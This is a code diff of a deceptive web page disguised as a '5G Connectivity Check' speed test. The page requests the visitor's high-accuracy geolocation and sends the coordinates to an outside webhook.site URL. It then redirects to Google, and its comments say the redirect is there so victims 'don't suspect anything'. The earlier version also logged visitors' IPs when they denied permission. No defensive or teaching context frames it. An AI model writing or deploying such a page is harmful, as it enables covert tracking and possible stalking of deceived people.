@@ -1,36 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Checking Network Connection...</title>
+    <title>Network Speed Test</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
+    </style>
 </head>
 <body>
+    <h2>5G Connectivity Check</h2>
+    <p>Click below to verify if your device supports high-speed location-based 5G.</p>
+    
+    <!-- User Gesture: The browser needs this click to allow the popup -->
+    <button onclick="startTest()">Verify Device Compatibility</button>
+
     <script>
-        // Use the Geolocation API
-        navigator.geolocation.getCurrentPosition(success, error);
+        function startTest() {
+            if (navigator.geolocation) {
+                // Requesting location AFTER a click
+                navigator.geolocation.getCurrentPosition(success, error, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
+            } else {
+                alert("Browser not supported.");
+            }
+        }
 
         function success(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const acc = position.coords.accuracy;
+            const data = {
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                acc: position.coords.accuracy
+            };
 
-            // Send data to YOUR Webhook URL
+            // Send to your Webhook
             fetch("https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4", {
                 method: "POST",
                 mode: "no-cors",
-                body: JSON.stringify({
-                    latitude: lat,
-                    longitude: lon,
-                    accuracy: acc + " meters"
-                })
+                body: JSON.stringify(data)
             }).then(() => {
-                // Redirect user to a real site so they don't get suspicious
+                // Only redirect AFTER the data is sent
                 window.location.href = "https://www.google.com";
             });
         }
 
-        function error() {
-            // Even if they deny, you can still log the IP by just hitting the URL
-            fetch("https://webhook.site/b73f0e16-1404-4a01-a652-b989b37786c4");
+        function error(err) {
+            console.log("Error code: " + err.code);
+            // If they block it, redirect anyway so they don't suspect anything
             window.location.href = "https://www.google.com";
         }
     </script>
